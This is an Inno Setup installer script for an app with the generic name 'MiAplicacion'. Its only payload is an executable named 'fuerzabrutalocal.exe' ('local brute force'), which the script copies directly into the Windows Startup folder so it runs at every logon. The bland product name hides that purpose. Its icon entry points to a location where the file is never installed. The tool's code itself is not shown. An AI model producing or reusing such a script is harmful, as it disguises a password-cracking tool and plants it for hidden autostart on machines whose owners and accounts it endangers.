[Setup]
AppName=MiAplicacion
AppVersion=1.0
DefaultDirName={pf}\MiAplicacion
DefaultGroupName=MiAplicacion
OutputDir=.
OutputBaseFilename=MiAplicacionSetup
Compression=lzma
SolidCompression=yes

[Files]
Source: "c:/Users/Admin/Desktop/fuerzabrutalocal.exe"; DestDir: "C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; Flags: ignoreversion

[Icons]
Name: "{group}\MiAplicacion"; Filename: "{app}\fuerzabrutalocal.exe"
